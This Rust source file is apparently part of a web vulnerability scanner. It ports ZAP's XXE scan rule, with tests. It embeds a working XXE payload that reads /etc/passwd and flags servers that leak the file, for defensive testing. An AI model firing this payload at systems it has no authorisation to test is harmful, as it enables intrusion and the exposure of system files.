// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright 2026 Cave Runtime contributors
// Source: zaproxy/zap-extensions@addOns/ascanrules/.../XxeScanRule.java
//
//! XML External Entity probe — submits an XXE payload that points at
//! `file:///etc/passwd` and checks whether passwd contents leak into
//! the response. Mirrors ZAP plugin id 90023.
//!
//! Partial port: the upstream rule also supports an out-of-band DNS
//! callback channel for blind XXE — that requires an authoritative DNS
//! server we control, so it's deferred. The reflective in-body channel
//! is fully implemented here.

use super::{ActiveScanRule, PluginId, Probe};
use crate::alert::Alert;
use crate::http::{HeaderMap, HttpMethod, HttpRequest, HttpResponse};
use crate::models::RiskLevel;

pub struct XxeRule;

const REFLECTIVE_PAYLOAD: &str = r#"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"#;

impl ActiveScanRule for XxeRule {
    fn id(&self) -> PluginId {
        90023
    }
    fn name(&self) -> &'static str {
        "XML External Entity (XXE)"
    }
    fn risk(&self) -> RiskLevel {
        RiskLevel::High
    }
    fn cwe_id(&self) -> u32 {
        611
    }
    fn wasc_id(&self) -> u32 {
        43
    }

    fn probes(&self, req: &HttpRequest) -> Vec<Probe> {
        // Only useful against requests that already carry an XML body or
        // XML content-type — otherwise the server won't parse the payload.
        let is_xml_ct = req
            .headers
            .first("Content-Type")
            .map(|c| c.contains("xml"))
            .unwrap_or(false);
        let body_looks_xml = req.body_str().unwrap_or("").trim_start().starts_with('<');
        if !(is_xml_ct || body_looks_xml) {
            return Vec::new();
        }
        let mut mutated = HttpRequest {
            method: HttpMethod::Post,
            url: req.url.clone(),
            version: req.version.clone(),
            headers: HeaderMap::default(),
            body: REFLECTIVE_PAYLOAD.as_bytes().to_vec(),
        };
        mutated.headers.insert("Content-Type", "application/xml");
        vec![Probe {
            original: req.clone(),
            mutated,
            plugin_id: self.id(),
            note: "reflective".to_string(),
        }]
    }

    fn check(&self, probe: &Probe, response: &HttpResponse) -> Option<Alert> {
        let body = response.body_str().unwrap_or("");
        if body.contains("root:x:0:0:") {
            return Some(Alert {
                name: self.name().to_string(),
                risk: self.risk(),
                cwe_id: self.cwe_id(),
                url: probe.mutated.url.clone(),
                description: "XML parser resolved an external entity pointing at /etc/passwd."
                    .to_string(),
                solution:
                    "Disable DTDs entirely. JAXP: `XMLConstants.FEATURE_SECURE_PROCESSING` + `disallow-doctype-decl`."
                        .to_string(),
                evidence: Some("root:x:0:0:".to_string()),
                plugin_id: self.id(),
            });
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rule_metadata() {
        let r = XxeRule;
        assert_eq!(r.id(), 90023);
        assert_eq!(r.cwe_id(), 611);
    }

    #[test]
    fn probes_skip_non_xml_request() {
        let r = XxeRule;
        let req = HttpRequest::new(HttpMethod::Post, "http://x/api");
        // No XML hint — skip.
        assert!(r.probes(&req).is_empty());
    }

    #[test]
    fn probes_run_when_content_type_xml() {
        let r = XxeRule;
        let mut req = HttpRequest::new(HttpMethod::Post, "http://x/api");
        req.headers.insert("Content-Type", "application/xml");
        req.body = b"<a/>".to_vec();
        assert_eq!(r.probes(&req).len(), 1);
    }

    #[test]
    fn probes_run_when_body_looks_xml() {
        let r = XxeRule;
        let mut req = HttpRequest::new(HttpMethod::Post, "http://x/api");
        req.body = b"<root><a/></root>".to_vec();
        assert_eq!(r.probes(&req).len(), 1);
    }

    #[test]
    fn detect_reflective_xxe() {
        let r = XxeRule;
        let req = HttpRequest::new(HttpMethod::Post, "http://x/api");
        let probe = Probe {
            original: req.clone(),
            mutated: req,
            plugin_id: r.id(),
            note: "p".to_string(),
        };
        let mut resp = HttpResponse::new(200, "OK");
        resp.body = b"<foo>root:x:0:0:root:/root:/bin/bash\n</foo>".to_vec();
        assert!(r.check(&probe, &resp).is_some());
    }
}
